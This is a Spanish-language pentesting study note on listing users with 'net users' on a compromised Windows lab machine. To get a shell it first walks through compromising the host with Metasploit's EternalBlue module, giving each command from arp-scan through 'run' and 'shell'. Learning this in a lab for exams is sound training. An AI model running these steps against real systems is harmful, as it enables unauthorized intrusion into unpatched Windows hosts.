
----
- TAG: #Enumeración #Usuarios #Sistema #Windows 
-----
## Identificación de Usuarios en una Máquina Windows Comprometida

En este apartado, aprenderemos un comando sencillo pero útil que puede ser de gran ayuda durante un examen o en situaciones de intrusión en máquinas **Windows**. Es importante conocer este comando, ya que es común que se pregunte cuántos usuarios hay dentro de una máquina comprometida.

### Comando para Listar Usuarios

El comando que utilizaremos es:

```cmd
net users
```

Este comando muestra todos los usuarios existentes en la computadora.

### Ejemplo Práctico

Ahora, aplicaremos este comando en una máquina que hayamos comprometido. Usaremos la máquina **Windows Vulnerable** mencionada en la clase anterior y nuestra máquina **Kali Linux**.

1. **Localizar la Máquina Víctima**

   Utiliza `arp-scan` para localizar la dirección IP de la máquina Windows comprometida:

```bash
arp-scan -I eth0 --localnet
```

   Copia la dirección IP de la máquina víctima.

2. **Iniciar Metasploit y Ejecutar EternalBlue**

   Inicia **Metasploit** y busca el exploit `EternalBlue` para comprometer la máquina Windows:

```bash
msfconsole
```

   Busca el exploit `EternalBlue`:

```bash
search eternalblue
```

   Usa el primer exploit que aparezca en los resultados:

```bash
use 0 
```

   Revisa las configuraciones necesarias:

```bash
show options 
```

   Configura los parámetros necesarios, incluyendo la dirección IP de la máquina Windows:

```bash
set RHOST 1.2.3.4
```

   Con las demás configuraciones predefinidas, ejecuta el exploit:

```bash
run
```

3. **Ejecutar el Comando `net users`**

   Una vez dentro de **Meterpreter**, accede a una `shell`:

```bash
shell
```

   Ejecuta el comando para listar los usuarios:

```cmd
net users
```

   Esto mostrará todos los usuarios dentro de la máquina Windows. Por ejemplo, en el caso de la máquina vulnerable utilizada, los usuarios podrían ser `Administrador`, `invitado`, y `mario`, haciendo un total de tres usuarios.

### Conclusión

El comando `net users` es una herramienta simple pero poderosa para identificar rápidamente los usuarios en un sistema Windows comprometido. Conocer y utilizar este comando puede ser clave en situaciones de examen o durante actividades de penetración.

---

